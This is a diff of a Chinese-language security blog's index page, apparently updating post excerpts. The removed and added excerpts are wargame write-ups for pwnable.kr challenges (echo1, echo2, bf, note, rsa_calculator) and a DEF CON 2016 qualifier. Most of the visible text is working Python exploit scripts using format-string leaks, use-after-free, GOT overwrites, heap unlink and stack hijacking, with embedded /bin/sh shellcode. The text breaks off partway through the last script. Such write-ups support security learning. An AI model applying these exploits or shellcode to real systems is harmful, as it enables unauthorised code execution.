@@ -298,8 +298,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/07/25/pwnable-rookiss-echo2/" itemprop="url">
-                  pwnable.kr-rookiss-echo2
+                <a class="post-title-link" href="/2016/08/05/pwnable-rookiss-note/" itemprop="url">
+                  pwnable.kr-rookiss-note
                 </a>
               
             
@@ -312,8 +312,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-25T00:00:00+08:00" content="2016-07-25">
-              2016-07-25
+            <time itemprop="dateCreated" datetime="2016-08-05T00:00:00+08:00" content="2016-08-05">
+              2016-08-05
             </time>
           </span>
 
@@ -342,8 +342,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/07/25/pwnable-rookiss-echo2/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/25/pwnable-rookiss-echo2/" itemprop="commentsCount"></span>
+                <a href="/2016/08/05/pwnable-rookiss-note/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/05/pwnable-rookiss-note/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -367,275 +367,18 @@
 
       
         
-          
-            <h2 id="Trick">Trick</h2><p>对于x64<strong>fsb</strong></p>
-<ul>
-<li><code>%1$lx</code>: RSI</li>
-<li><code>%2$lx</code>: RDX</li>
-<li><code>%3$lx</code>: RCX</li>
-<li><code>%4$lx</code>: R8</li>
-<li><code>%5$lx</code>: R9</li>
-<li><code>%6$lx</code>: 栈上的第一个QWORD</li>
+          <h2 id="Conclusion">Conclusion</h2><ul>
+<li><code>select_menu()</code>函数是递归调用自身的，并且函数开始都会分配一个0x400字节的空间，每进行一次选择，栈都会至少增长0x400</li>
+<li><code>exit</code>服务会进行ret，即程序会一直ret到main函数，在这过程中，只要我们劫持了栈上保存的任意某个$eip值，程序流就可以控制了</li>
 </ul>
-<h2 id="Conclusion">Conclusion</h2><p>虽然这题看起来很常规，既有fsb也有uaf，但是我的思路又错了QAQ，刚开始没有想到注意到这题也是没有开NX的，思路就歪了，看到fsb首先做的是泄露libc地址，然后想通过uaf实现ret2libc，但是这里似乎故意对<code>echo3</code>中的字符串长度做了限制，导致<code>o+4*8</code>不能被覆盖到，如果是覆盖<code>o+3*8</code>为<code>system</code>地址的话，然后试图在<code>o</code>中写入字符串<code>/bin/sh\x00</code>，会发现<code>o</code>在被free后fd指针会被覆盖，导致写好的<code>/bin/sh\x00</code>字符串被破坏，这种方法我想了很久没有想出来</p>
-<p>后来又是google一些做法，才想到利用<code>uaf</code>jump到栈上存放shellcode的name数组上，而shellcode的地址，可以利用<code>fsb</code>来泄露<code>$rbp</code>的值而得到，还是too naive</p>
-<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">## Exploit</span></span><br><span class="line">​```python</span><br><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./echo2'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9011</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io.gdb_hint([0x400864, 0x400886])</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x400887])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://www.exploit-db.com/exploits/36858/</span></span><br><span class="line">shellcode = <span class="string">"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56"</span><span class="string">"\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span></span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">"hey, what's your name? :"</span>)</span><br><span class="line">io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fsb</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.readline()</span><br><span class="line">    io.writeline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">uaf</span><span class="params">(payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.readline()</span><br><span class="line">    io.writeline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">freeo</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Are you sure you want to exit? (y/n)'</span>)</span><br><span class="line">    io.writeline(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">payload0    =   <span class="string">"%10$016lx"</span></span><br><span class="line">fsb(payload0)</span><br><span class="line"></span><br><span class="line">adr_sc      =   int((io.read(<span class="number">16</span>)), <span class="number">16</span>) - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line">freeo()</span><br><span class="line">payload1    =   <span class="string">''</span>.ljust(<span class="number">0x18</span>, <span class="string">'A'</span>)</span><br><span class="line">payload1    +=  l64(adr_sc)</span><br><span class="line">uaf(payload1)</span><br><span class="line">io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">io.writeline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-<h2 id="Reference">Reference</h2><p><a href="https://gist.github.com/ihciah/46a389321db5ab04f31b" target="_blank" rel="external">https://gist.github.com/ihciah/46a389321db5ab04f31b</a></p>
-<p><a href="http://blog.yiz96.com/archives/120" target="_blank" rel="external">http://blog.yiz96.com/archives/120</a></p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/25/pwnable-rookiss-echo1/" itemprop="url">
-                  pwnable.kr-rookiss-echo1
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-25T00:00:00+08:00" content="2016-07-25">
-              2016-07-25
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/25/pwnable-rookiss-echo1/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/25/pwnable-rookiss-echo1/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="Trick">Trick</h2><p>没有开NX，又是简单的栈溢出，利用<code>jmp esp</code>来执行栈上的shellcode</p>
-<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./echo1'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9010</span>)</span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x00400871</span>])</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">"hey, what's your name? : "</span>)</span><br><span class="line">opcode_jmp_esp  = <span class="string">'\xff\xe4'</span></span><br><span class="line">io.writeline(opcode_jmp_esp)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">io.writeline(<span class="string">'1'</span>)</span><br><span class="line">io.readline()</span><br><span class="line"></span><br><span class="line">adr_id      =   <span class="number">0x6020a0</span></span><br><span class="line">shellcode   = <span class="string">"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"</span>;</span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'A'</span> * <span class="number">40</span></span><br><span class="line">payload +=  l64(adr_id)</span><br><span class="line">payload +=  shellcode</span><br><span class="line">io.writeline(payload)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/24/pwnable-rookiss-brainfuck/" itemprop="url">
-                  pwnable.kr-rookiss-bf
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-24T00:00:00+08:00" content="2016-07-24">
-              2016-07-24
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/Wargames/" itemprop="url" rel="index">
-                    <span itemprop="name">Wargames</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/2016/07/24/pwnable-rookiss-brainfuck/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/24/pwnable-rookiss-brainfuck/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <ul>
-<li><code>&lt;</code>: 指针-1</li>
-<li><code>&gt;</code>: 指针+1</li>
-<li><code>.</code>: 读取指针指向的字节</li>
-<li><code>,</code>: 往指针指向的字节写入一个字节</li>
-</ul>
-<h2 id="Conclusion">Conclusion</h2><ol>
-<li>修改<code>putchar</code>的got表内的地址为<code>main</code>首地址</li>
-<li>修改<code>memset</code>的got表内的地址为<code>gets</code>的地址</li>
-<li>修改<code>fgets</code>的got表内的地址为<code>system</code>的地址</li>
-<li>利用<code>.</code>触发</li>
-</ol>
-<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./bf'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>,<span class="number">9001</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">100000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x8048717</span>])</span><br><span class="line"></span><br><span class="line">adr_tape    = <span class="number">0x804a0a0</span></span><br><span class="line">adr_p       = <span class="number">0x804a080</span></span><br><span class="line">got_putchar = <span class="number">0x804a030</span></span><br><span class="line">got_memset  = <span class="number">0x804a02c</span></span><br><span class="line">got_fgets   = <span class="number">0x804a010</span></span><br><span class="line">off_putchar = <span class="number">0x00677d0</span></span><br><span class="line">off_system  = <span class="number">0x003f0b0</span></span><br><span class="line">off_gets    = <span class="number">0x0065e90</span></span><br><span class="line">adr_main    = <span class="number">0x8048671</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#off_putchar = 0x0066480</span></span><br><span class="line"><span class="comment">#off_system  = 0x0040190</span></span><br><span class="line"><span class="comment">#off_fgets   = 0x0063b20</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_bf</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (l32(io.read(<span class="number">4</span>)) - off_putchar)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'type some brainfuck instructions except [ ]\n'</span>)</span><br><span class="line"></span><br><span class="line">payload     =   <span class="string">'&lt;'</span> * (adr_tape - adr_p)</span><br><span class="line">payload     +=  <span class="string">','</span>             <span class="comment"># write</span></span><br><span class="line">payload     +=  <span class="string">'..&gt;.&gt;.&gt;.'</span>      <span class="comment"># read</span></span><br><span class="line">payload     +=  <span class="string">'&lt;&lt;&lt;,&gt;,&gt;,&gt;,&lt;&lt;&lt;'</span>    <span class="comment"># write</span></span><br><span class="line">payload     +=  <span class="string">'&lt;'</span> * (got_putchar - got_memset)</span><br><span class="line">payload     +=  <span class="string">',&gt;,&gt;,&gt;,&lt;&lt;&lt;'</span></span><br><span class="line">payload     +=  <span class="string">'&lt;'</span> * (got_memset - got_fgets)</span><br><span class="line">payload     +=  <span class="string">',&gt;,&gt;,&gt;,&lt;&lt;&lt;'</span></span><br><span class="line">payload     +=  <span class="string">'.'</span>             <span class="comment"># invoke</span></span><br><span class="line"></span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.write(<span class="string">'\x30'</span>)</span><br><span class="line">io.read(<span class="number">1</span>)</span><br><span class="line">libc_base   = read_bf()</span><br><span class="line">adr_system  = libc_base + off_system</span><br><span class="line">adr_gets    = libc_base + off_gets</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] libc base:       0x%x'</span> % libc_base</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] system address:  0x%x'</span> % adr_system</span><br><span class="line">io.write(l32(adr_main))</span><br><span class="line">io.write(l32(adr_gets))</span><br><span class="line">io.write(l32(adr_system))</span><br><span class="line">io.writeline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<p>劫持的方法就显得比较暴力了，我们可以先通过不断调用某个函数，把栈先进行扩充（栈的扩充这个行为叫做<strong>automatic stack expansion</strong>)</p>
+<p>栈的最大扩充的大小可以通过<code>ulimit -s</code>，一般是0x800000bytes，但是如果扩充的太多的话，再执行后面的操作到时候就可能爆栈了，所以我们扩充个一半大小，类似二次函数的极点</p>
+<p>接着，我们只要不断的<code>create_note</code>&amp;&amp;<code>delete_note</code>，直到分配到了一个我们想要的位置（服务器没有开aslr），然后往里面写入shellcode所在的地址即可（<code>write_note</code>没有做长度检查，所以想写多少写多少，写个0x500字节就肯定能覆盖到某个$eip了） </p>
+<p>这样还是有一定概率失败的，因为在不断的分配删除内存的过程，栈仍然会扩充，但是我的exp里的那个作为界限的地址是写死的，所以有可能<code>mmap</code>出来的内存其实已经在栈上了但是却又被<code>munmap</code>了，这样的结果就是栈的中间出现了断层，在ret的时候就可能会ret到这段内存，导致segment fault，不过这种碰运气的事，只要一直试就好了，所以一个死循环就搞定了。(这个exp放在服务器上跑大概要好几分钟，毕竟我的方法太暴力了。如果有好的方法一定要告诉我哦)</p>
+<p>另外，忘记了这题是本地利用，用了zio写的，后来才利用，不过看了下服务器上有pwntools，就又写了个pwntools的版本，不过还是贴了zio的exp版本上来(pwntools之前没怎么用过，mark一下)</p>
+<h2 id="Exploit">Exploit</h2><h3 id="pwntools">pwntools</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_note</span><span class="params">(conn)</span>:</span></span><br><span class="line">    conn.recvuntil(<span class="string">'5. exit'</span>)</span><br><span class="line">    conn.sendline(<span class="string">'1'</span>)</span><br><span class="line">    conn.recvuntil(<span class="string">'note created. no '</span>)</span><br><span class="line">    no = conn.recvline()[<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line">    conn.recvuntil(<span class="string">'['</span>)</span><br><span class="line">    <span class="keyword">return</span> (int(no), int(conn.recvuntil(<span class="string">']'</span>)[<span class="number">0</span>:-<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_note</span><span class="params">(conn, no, payload)</span>:</span></span><br><span class="line">    conn.recvuntil(<span class="string">'5. exit'</span>)</span><br><span class="line">    conn.sendline(<span class="string">'2'</span>)</span><br><span class="line">    conn.recvuntil(<span class="string">'note no?'</span>)</span><br><span class="line">    conn.sendline(str(no))</span><br><span class="line">    conn.recvuntil(<span class="string">'4096 byte)'</span>)</span><br><span class="line">    conn.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_note</span><span class="params">(conn, no)</span>:</span></span><br><span class="line">    conn.recvuntil(<span class="string">'5. exit'</span>)</span><br><span class="line">    conn.sendline(<span class="string">'3'</span>)</span><br><span class="line">    conn.recvuntil(<span class="string">'note no?'</span>)</span><br><span class="line">    conn.sendline(str(no))</span><br><span class="line">    conn.recvline()</span><br><span class="line">    <span class="keyword">return</span> conn.recvline()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span><span class="params">(conn, no)</span>:</span></span><br><span class="line">    conn.recvuntil(<span class="string">'5. exit'</span>)</span><br><span class="line">    conn.sendline(<span class="string">'4'</span>)</span><br><span class="line">    conn.recvuntil(<span class="string">'note no?'</span>)</span><br><span class="line">    conn.sendline(str(no))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit_ret</span><span class="params">(conn)</span>:</span></span><br><span class="line">    conn.recvuntil(<span class="string">'5. exit'</span>)</span><br><span class="line">    conn.sendline(<span class="string">'5'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">secret</span><span class="params">(conn, payload)</span>:</span></span><br><span class="line">    conn.recvuntil(<span class="string">'5. exit'</span>)</span><br><span class="line">    conn.sendline(str(<span class="number">0x31337</span>))</span><br><span class="line">    conn.recvuntil(<span class="string">'this'</span>)</span><br><span class="line">    conn.sendline(payload)</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    conn    = remote(<span class="string">'127.0.0.1'</span>, <span class="number">9019</span>)</span><br><span class="line">    mem     = create_note(conn)</span><br><span class="line">    <span class="keyword">while</span> mem[<span class="number">1</span>] &gt; <span class="number">0xf0000000</span>:</span><br><span class="line">        delete_note(conn, mem[<span class="number">0</span>])</span><br><span class="line">        mem = create_note(conn)</span><br><span class="line">    write_note(conn, mem[<span class="number">0</span>], shellcode.rjust(<span class="number">0x100</span>, <span class="string">'\x90'</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># stack expansion</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range (<span class="number">0</span>, <span class="number">0x1000</span>):</span><br><span class="line">        secret(conn, <span class="string">'A'</span> * <span class="number">0x400</span>)</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-] stack expansion  :"</span> + str(i)</span><br><span class="line"></span><br><span class="line">    mem1 = create_note(conn)</span><br><span class="line">    <span class="keyword">while</span> (mem1[<span class="number">1</span>] &lt; <span class="number">0xffd60000</span>) <span class="keyword">or</span> (mem[<span class="number">1</span>] &gt; <span class="number">0xffffd000</span>):</span><br><span class="line">        delete_note(conn, mem1[<span class="number">0</span>])</span><br><span class="line">        mem1    = create_note(conn)</span><br><span class="line">        note    = read_note(conn, mem1[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-] memory address   : "</span> + hex(mem1[<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-] note             : "</span> + note.encode(<span class="string">'hex'</span>) + <span class="string">'\n'</span></span><br><span class="line">        <span class="keyword">if</span> (mem1[<span class="number">1</span>] &gt;= <span class="number">0xf7ffc000</span>) <span class="keyword">and</span> (mem1[<span class="number">1</span>] &lt; <span class="number">0xffd60000</span>):</span><br><span class="line">            <span class="keyword">if</span> note != <span class="string">'\x0a'</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    payload = p32(mem[<span class="number">1</span>]) * (<span class="number">0x1000</span>/<span class="number">4</span>-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'\n-------------find it-------------------'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] write to     :   '</span> + hex(mem1[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[+] with payload :   '</span> + payload.encode(<span class="string">'hex'</span>)</span><br><span class="line">    write_note(conn, mem1[<span class="number">0</span>], payload)</span><br><span class="line"></span><br><span class="line">    exit_ret(conn)</span><br><span class="line">    conn.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>
           <div class="post-more-link text-center">
-            <a class="btn" href="/2016/07/24/pwnable-rookiss-brainfuck/#more" rel="contents">
+            <a class="btn" href="/2016/08/05/pwnable-rookiss-note/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -686,8 +429,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/07/21/def-con-qual-2016-babyfirst/" itemprop="url">
-                  def-con-qual-2016-babyfirst
+                <a class="post-title-link" href="/2016/08/02/pwnable-rookiss-rsa-calculator/" itemprop="url">
+                  pwnable.kr-rookiss-rsa-calculator
                 </a>
               
             
@@ -700,8 +443,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-21T00:00:00+08:00" content="2016-07-21">
-              2016-07-21
+            <time itemprop="dateCreated" datetime="2016-08-02T00:00:00+08:00" content="2016-08-02">
+              2016-08-02
             </time>
           </span>
 
@@ -714,8 +457,8 @@
               <span class="post-meta-item-text">分类于</span>
               
                 <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/CTFs/" itemprop="url" rel="index">
-                    <span itemprop="name">CTFs</span>
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
                   </a>
                 </span>
 
@@ -730,8 +473,8 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/07/21/def-con-qual-2016-babyfirst/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/21/def-con-qual-2016-babyfirst/" itemprop="commentsCount"></span>
+                <a href="/2016/08/02/pwnable-rookiss-rsa-calculator/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/08/02/pwnable-rookiss-rsa-calculator/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -756,10 +499,11 @@
       
         
           
-            <h1 id="Environment">Environment</h1><blockquote>
-<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
-</blockquote>
-<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c'</span></span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x8048adb</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">"Exit function pointer"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">        io.read_line()</span><br><span class="line">    io.read_until(<span class="string">"loc="</span>)</span><br><span class="line">    loc = int(io.read_until(<span class="string">"]"</span>)[<span class="number">0</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    io.read_until(<span class="string">"size="</span>)</span><br><span class="line">    size = int(io.read_until(<span class="string">"]"</span>)[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> (loc, size)</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">        <span class="string">"\xeb\x06\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line">        <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"</span></span><br><span class="line">        <span class="string">"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">(loc, size) = pre()</span><br><span class="line"></span><br><span class="line">got_printf  = <span class="number">0x804c004</span></span><br><span class="line"></span><br><span class="line">fake0   =   <span class="string">'A'</span> * (size - <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">fake1   =   l32(size + <span class="number">0x4</span>) </span><br><span class="line">fake1   +=  l32((<span class="number">0x10</span>) | <span class="number">0x1</span>) </span><br><span class="line">fake1   =   fake1.ljust(<span class="number">0x10</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">fake2   =   l32(<span class="number">0x10</span>) </span><br><span class="line">fake2   +=  l32(<span class="number">0x80</span> | <span class="number">0x1</span>) </span><br><span class="line">fake2   +=  l32(got_printf - <span class="number">0x4</span> * <span class="number">2</span>)</span><br><span class="line">fake2   +=  l32(loc + size + <span class="number">0x10</span> + <span class="number">0xc</span>)</span><br><span class="line">fake2   +=  shellcode</span><br><span class="line">fake2   =   fake2.ljust(<span class="number">0x80</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">fake3   =   l32(<span class="number">0x80</span>)</span><br><span class="line">fake3   +=  l32(<span class="number">0x41</span> &amp; <span class="number">0xfffffff8</span>)</span><br><span class="line"></span><br><span class="line">fake    =   fake0 + fake1 + fake2 + fake3</span><br><span class="line"></span><br><span class="line">io.writeline(fake)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+            <h2 id="Conclusion">Conclusion</h2><p>这道题的bug在<code>RSA_decrypt</code>函数里的<code>printf(g_pbuf)</code>，即典型的<strong>fsb漏洞</strong>，我的利用方法是覆盖<strong>got表</strong>里的<code>printf</code>和<code>putchar</code>分别为<code>system</code>和fsb发生所在的地址处</p>
+<h2 id="Trick">Trick</h2><ul>
+<li>system(junk+”/bin/sh\x00”);</li>
+</ul>
+<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./rsa_calculator'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9012</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_key</span><span class="params">(io, p, q, e, d)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'p :'</span>)</span><br><span class="line">    io.writeline(str(p))</span><br><span class="line">    io.read_until(<span class="string">'q :'</span>)</span><br><span class="line">    io.writeline(str(q))</span><br><span class="line">    io.read_until(<span class="string">'e :'</span>)</span><br><span class="line">    io.writeline(str(e))</span><br><span class="line">    io.read_until(<span class="string">'d :'</span>)</span><br><span class="line">    io.writeline(str(d))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span 